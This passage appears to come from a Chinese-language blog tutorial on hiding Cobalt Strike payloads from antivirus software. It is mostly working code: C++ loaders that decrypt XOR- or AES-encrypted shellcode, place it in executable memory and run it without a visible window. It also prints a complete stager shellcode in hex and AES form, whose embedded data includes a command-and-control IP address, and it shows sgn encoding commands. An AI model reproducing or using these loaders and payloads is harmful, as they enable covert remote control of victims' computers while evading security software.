class="built_in">print</span>(encrypted_shellcode_string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>然后在C语言中解密shellcode并生成exe</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  <span class="comment">//导入windows api和一些常量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//不显示黑窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//main函数，程序入口函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//异或加密后的shellcode</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> encryptShellcode[] = <span class="string">&quot;\x94\x2d\xed...&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//解密密钥</span></span><br><span class="line">	<span class="type">char</span> key[] = <span class="string">&quot;henry&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//定义一个用于储存解密后shellcode的数组</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> decryptShellcode[<span class="built_in">sizeof</span>(encryptShellcode)];</span><br><span class="line"></span><br><span class="line">	<span class="comment">//进行异或解密</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(encryptShellcode); i++) &#123;</span><br><span class="line">		decryptShellcode[i] = encryptShellcode[i] ^ key[i % (<span class="built_in">strlen</span>(key))];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1、申请内存</span></span><br><span class="line">	LPVOID addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(decryptShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、拷贝 shellcode 到内存</span></span><br><span class="line">	<span class="built_in">memcpy</span>(addr, decryptShellcode, <span class="built_in">sizeof</span>(decryptShellcode));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//3、执行内存中的shellcode</span></span><br><span class="line">	<span class="comment">//创建线程执行</span></span><br><span class="line">	HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)addr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//等待线程运行</span></span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">	<span class="comment">//关闭线程</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br></pre></td></tr></table></figure>

<p>测试可以正常上线并执行命令</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250519132923223.png" alt="image-20250519132923223"></p>
<p>上面尝试的是一次异或，还有可能出现一次异或不免杀，但是多次异或免杀的情况。</p>
<p>也可以将shellcode进行base64编解码进行加密。</p>
<h6 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h6><p>借用写好的C++实现的AES算法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/witto_sdy/article/details/83375999">https://blog.csdn.net/witto_sdy/article/details/83375999</a></p>
<p>自己编译了一个AES加密shellcode的exe程序，用法如下所示，shellcode字符串保存在shellcode.txt中</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">E:\免杀\shellcode_AES\x64\Release&gt;shellcode_AESencrypt.exe shellcode.txt</span><br><span class="line">字符串类型shellcode: fc4883e4f0e8c8000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b0275728b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94fffffff5d6a0049be77696e696e65740041564989e64c89f141ba4c772607ffd54831c94831d24d31c04d31c94150415041ba3a5679a7ffd5eb735a4889c141b81d0900004d31c9415141516a03415141ba57899fc6ffd5eb595b4889c14831d24989d84d31c9526800024084525241baeb552e3bffd54889c64883c3506a0a5f4889f14889da49c7c0ffffffff4d31c9525241ba2d06187bffd585c00f859d01000048ffcf0f848c010000ebd3e9e4010000e8a2ffffff2f77424f550049558ad440f8cbb82090aabb087fbc19664bc522324df21287bc4c0feb261af1e02375e09cdf0cb267c3f2ded228bc046d585658d2aa7f844bdc02aa97319d0b0f49dcafa112674e0d00557365722d4167656e743a204d6f7a696c6c612f342e302028636f6d70617469626c653b204d53494520382e303b2057696e646f7773204e5420352e313b2054726964656e742f342e303b205151446f776e6c6f6164203733333b202e4e455420434c5220322e302e3530373237290d0a00e891332d3bb9805d90d0202d53b562d2c920e2abe4478b6798b8ce5317acfecc8ca7fbaff1387110a225a5d21691d9cc114b70ba89c3d8839ee52bc862153a2d2d8fb60a38d51dad2206c5523c89a1beaf450d6b3e93ec484466535e94278ca38176fb76186b59e1ad1a974cd42f233709c173a62f4b20b08f4f36a2c4e43931b4ced5e6d4b89bbd6b2a453dd9528d5803ef65bd24185c7ea58bf1f88f1ae93418d3d20ab9b09a95f070778ad31154bb9bc10ca5a6f8c02ae2252941e30041bef0b5a256ffd54831c9ba0000400041b80010000041b94000000041ba58a453e5ffd5489353534889e74889f14889da41b8002000004989f941ba129689e2ffd54883c42085c074b6668b074801c385c075d758585848050000000050c3e89ffdffff3130312e34322e31332e313035006faa51c300</span><br><span class="line">AES加密shellcode: R40EhbDwj5jt8m3+I4fffVYkiWaT0lsleSbIhcuTmsw4hhlpz3qBzvkOF+XErJ1WIRu4O2DxEQw1ha96wkT1jSk8bNivq<span class="regexp">/t6zWSSH76SL0SZ67hJqtcgk1tR/</span>CtZwOX2n10YQ89lm7yohoaJZlpOZvNpy7hIYYH9IyAW6Uyd85IrcJPNgtwFIzkF+BSOD6z2F5JGeHLh8<span class="regexp">/EmsYlbx2H+BHtwyGPWTQBwhF9W2+NfcYFrR0IyJHFAiLFIKQDcn2wu39lc4IbYaP4rTbYj6k6oourqgNRNrOV50DZk2pXWg6PXFlZbH1wAZ9HyA7tbdPAH1hWhuIRFJU57YMre72dMHo3Mh8NsNyGF7QSYNvpIgyoMHchAEZFOb5HoD3LTkojacdNfYpnCy5RZS2XkUSehsaV5eX+kPuCFQ1jDZ1LYhl5BlyLyCrH2Ph2bqAQYw3HxlRR6JRyzamneMt5TlHtHWO2MBbNDdEg/</span>E7hHgyWjBw9N<span class="regexp">/yw1/</span><span class="number">6</span>UFCP<span class="regexp">/E1wsPbPADOty3q0Wn/</span>V2TWsG7LMyQlLP8jQyD6lBjA8+<span class="number">7</span>uOXulMg2IycCNzz7A4atD60uKTN8+IjM<span class="regexp">/sJUANkn6cmsylGpwQNsyxZQxK7dPFByPqdSx6OXxF0RbzXyKA5SUPbO0xZnjmj8+v2QJnf5nv2pywOKJyGuSq08tFfN1GXiNOsSzSdQr4HbHBsAVWLxagrrO/</span><span class="number">7</span>bZTo042rAsRPBqiX7cl<span class="regexp">/XpwMn91NT0K0eUJXpDU30J/u</span>PqXW9qKXJ3KdS240ORqGCLwTRM1n<span class="regexp">/6uSMHaM5rP6f8d9X0kQ4uXCl10SGXnPhStuO215wktkV8NmIF1bKEDo7eqgiB+tzTXGMIokpoSUgnaZvzcyf1MVd9L/</span><span class="number">4</span>K9<span class="regexp">/Mz2Lb1fn+61XnKlJNsHj+mqH21gE9sjw2kR4p/</span>Ec1<span class="regexp">/T/</span>aVQqIYgMSO2G943KmjcGUEA<span class="regexp">/T5OON1UZJA3WWxgPICQKNr9/</span><span class="number">5</span>PQa6Hu0tfvs<span class="regexp">/i5+T/</span>Pw+<span class="number">53</span>qm93RpVJBMg9Gs0uSFmdgCF4wxG5DvWzNcxaWWllajQpDQtzyRHDauDt4cTL17negPFmgfZu+q6GieGQewwmO5bHY7KOuuQZxqSPOzCn4sauvUoO54ZmxQjI1NaKWzEbT9FgLRbRbSvM9KDL3XZoCUhoQC<span class="regexp">/M6JR6EUBi5AuPbd5qIAJwsnt87C9HqZo1eOq1uryQYRXuCWBqBNwqOd31pfbZf4xffKfF3dm4SnRj+XZG60cM4ZqwykyDsK8YeFVBw00Cf0Oas0fhpUdjHQDGQ41YDK82nDZrTASkwmP138a/</span>piiNjPAyao2lQhHROAI43Uc0IfDupwfxw+QUyMku3<span class="regexp">/4uCCHqVseL473KDnU7pT16S9VNwK5nHPNCAwh2kixph3RSgnjTu35BF4nCFOTyZLNXdMoshH3Iu5tRywo3X4ygq4SVcnNfKDqvOt1873b5jk1sj1QsN5hr5RX/</span>AZ6wx+wXVRt8kySyknUyAaiP0IaNtYVg9uIqIX0+VKMOLQz5CLW3c<span class="regexp">/SEV3ANP3NIiu7luTQi7sjTKwoWiGin9mTlnGVBoDdAxpXEPqHmWuLavOn1o3eq4Ot2/</span>horHLRML9sd3nn+nV3WY956kwE7d8z3G4D26uAP9zedir8FyG<span class="regexp">/CgCRCj8Vx1zSZzz8lael4AXm47vVx7uCgzInXZkbNfefdn3IEvm/</span>IWLaqwmDpguvboUNJXRc57Yr<span class="regexp">/Spwz4a0bNw+GIk+QFye8J2TcCgXEvvevyo3kKdvSIJtdpi2nRe2YRSuJz6JBX9Hw3H2ejDHmnUAaPHnhpiw8Zl0nYVrT3qoDI0rrauz6mdnr3mWyG2T36x9SsMCHOVCdd/</span>E20UzJQ7k1rZno9xkOIwL8CA0I+FSj2Q8ALNI7KNfprooiozli1Co3fGJ808j<span class="regexp">/o6H5RT29T5PiG7XxszGX0xfmeMNjipTdfDrGv9y6RnmCDfcBvqeHTDLxwL+odAS60PDKQCKnWA5RWrgSL5jRCfhjnl47zgHMufrp0ZNV5433Hc1EiKRflRx460re/</span>A1rVkL48F4KTVMCd9ZJ+XNzl3wHvQALOmaEAm99FAC9Vs2BHVv+<span class="number">9</span>WtpAqMJLr7VVOtMf5k20iGgib+VRzbyOxxm1LdPSbnP8jz1WbmSqQCsOCXkoR4EDoLC2Y8ZW3LAcPVZubeRm7Qr4ejFBAckst3pvcwZ2q6OMjAx9XQtOEDP8l7pl35h5hsm+ixNLJ9eE+<span class="number">6</span>t/cmtD7Xb0J9b88MKyAWC8mxfrbzkb2Tpuyq510zCx2LJ3uhejj4B7gpt8ERbDVBB4jiNzd7CxcNodGAMxjBdtq5xdulxvVWs87iDO3dj8Fw9s8daY6U8hHqUnvm3tyvfCvo0g2VLstv0dCBZOjanGDXoazG7irItqROrGnD4PT1iayInrC7g==</span><br><span class="line">AES解密shellcode: fc4883e4f0e8c8000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b0275728b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94fffffff5d6a0049be77696e696e65740041564989e64c89f141ba4c772607ffd54831c94831d24d31c04d31c94150415041ba3a5679a7ffd5eb735a4889c141b81d0900004d31c9415141516a03415141ba57899fc6ffd5eb595b4889c14831d24989d84d31c9526800024084525241baeb552e3bffd54889c64883c3506a0a5f4889f14889da49c7c0ffffffff4d31c9525241ba2d06187bffd585c00f859d01000048ffcf0f848c010000ebd3e9e4010000e8a2ffffff2f77424f550049558ad440f8cbb82090aabb087fbc19664bc522324df21287bc4c0feb261af1e02375e09cdf0cb267c3f2ded228bc046d585658d2aa7f844bdc02aa97319d0b0f49dcafa112674e0d00557365722d4167656e743a204d6f7a696c6c612f342e302028636f6d70617469626c653b204d53494520382e303b2057696e646f7773204e5420352e313b2054726964656e742f342e303b205151446f776e6c6f6164203733333b202e4e455420434c5220322e302e3530373237290d0a00e891332d3bb9805d90d0202d53b562d2c920e2abe4478b6798b8ce5317acfecc8ca7fbaff1387110a225a5d21691d9cc114b70ba89c3d8839ee52bc862153a2d2d8fb60a38d51dad2206c5523c89a1beaf450d6b3e93ec484466535e94278ca38176fb76186b59e1ad1a974cd42f233709c173a62f4b20b08f4f36a2c4e43931b4ced5e6d4b89bbd6b2a453dd9528d5803ef65bd24185c7ea58bf1f88f1ae93418d3d20ab9b09a95f070778ad31154bb9bc10ca5a6f8c02ae2252941e30041bef0b5a256ffd54831c9ba0000400041b80010000041b94000000041ba58a453e5ffd5489353534889e74889f14889da41b8002000004989f941ba129689e2ffd54883c42085c074b6668b074801c385c075d758585848050000000050c3e89ffdffff3130312e34322e31332e313035006faa51c300</span><br></pre></td></tr></table></figure>

<p>实现代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;aes.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Base64.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;doAes.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//不显示黑窗口</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//encbuf为AES加密后的shellcode字符串</span></span><br><span class="line">	string encbuf = <span class="string">&quot;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&quot;</span>;</span><br><span class="line">	<span class="comment">//解密aes加密后的encbuf</span></span><br><span class="line">	string decbuf = <span class="built_in">DecryptionAES</span>(encbuf);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;解密后的字符串为：&quot;</span> &lt;&lt; decbuf &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; tmp = <span class="built_in">HexStringToShellcode</span>(decbuf);</span><br><span class="line">	<span class="comment">// 分配固定大小数组（确保大小足够）</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[<span class="number">4096</span>]; <span class="comment">// 假设最大不会超过4096字节</span></span><br><span class="line">	<span class="built_in">memcpy</span>(buf, tmp.<span class="built_in">data</span>(), tmp.<span class="built_in">size</span>());</span><br><span class="line">	<span class="type">size_t</span> buf_len = tmp.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;回复后的shellcode数组为&quot;</span> &lt;&lt; buf &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//1、申请内存</span></span><br><span class="line">	LPVOID addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、拷贝 shellcode 到内存</span></span><br><span class="line">	<span class="built_in">memcpy</span>(addr, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//3、执行内存中的shellcode</span></span><br><span class="line">	<span class="comment">//创建线程执行</span></span><br><span class="line">	HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)addr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//等待线程运行</span></span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">	<span class="comment">//关闭线程</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成后点击成功上线CS</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250520103611759.png" alt="image-20250520103611759"></p>
<p>但是过火绒失败，悲。。</p>
<h5 id="shellcode内存加解密"><a href="#shellcode内存加解密" class="headerlink" title="shellcode内存加解密"></a>shellcode内存加解密</h5><p>sgn工具，所有工具都检测不出来shellcode</p>
<p><a target="_blank" rel="noopener" href="https://github.com/EgeBalci/sgn/releases">https://github.com/EgeBalci/sgn/releases</a></p>
<p>命令使用</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sgn<span class="selector-class">.exe</span> -<span class="selector-tag">a</span> <span class="number">64</span> -c <span class="number">1</span> -o pd_x64_stag<span class="selector-class">.bin</span> -<span class="selector-tag">i</span> payload_x64_stag.bin</span><br></pre></td></tr></table></figure>

<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-a：64位</span></span><br><span class="line"><span class="deletion">-c：编码轮数</span></span><br><span class="line"><span class="deletion">-o：编码后的文件</span></span><br><span class="line"><span class="deletion">-i：编码前的文件</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250520110901160.png" alt="image-20250520110901160"></p>
<p>完全去除了shellcode的特征，对shellcode做到了完全免杀</p>
<p>因为是内存加解密，所以不需要在代码中写解密函数了。</p>
<p>首先将pd.bin转换成十六进制，python代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bin_to_hex_escape</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line"></span><br><span class="line">    hex_escape = <span class="string">&#x27;&#x27;</span>.join([<span class="string">f&#x27;\\x<span class="subst">&#123;byte:02x&#125;</span>&#x27;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> content])</span><br><span class="line">    <span class="keyword">return</span> hex_escape</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例用法</span></span><br><span class="line">input_file = <span class="string">&#x27;E:\免杀\免杀工具\sgn\pd.bin&#x27;</span></span><br><span class="line">result = bin_to_hex_escape(input_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印或保存结果</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果想写入一个 .txt 文件：</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> out:</span><br><span class="line">    out.write(result)</span><br></pre></td></tr></table></figure>

<p>编译成exe自用</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250520113503880.png" alt="image-20250520113503880"></p>
<p>使用C++ shellcode加载器加载，生成shellcode.exe执行</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xe8\xa8\x03...&quot;</span>;</span><br><span class="line">	LPVOID addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,<span class="built_in">sizeof</span>(buf),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(addr, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">	HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)addr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功上线CS</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250520113610025.png" alt="image-20250520113610025"></p>
<p>但是火绒依然报毒。。。但是已经可以排除shellcode的问题了，有可能是代码结构、数字签名、资源文件等问题了。</p>
<h5 id="shellcode分离"><a href="#shellcode分离" class="headerlink" title="shellcode分离"></a>shellcode分离</h5><h6 id="本地分离"><a href="#本地分离" class="headerlink" title="本地分离"></a>本地分离</h6><p>将shellcode以文件读取的方式写入，C++加载器加载运行</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 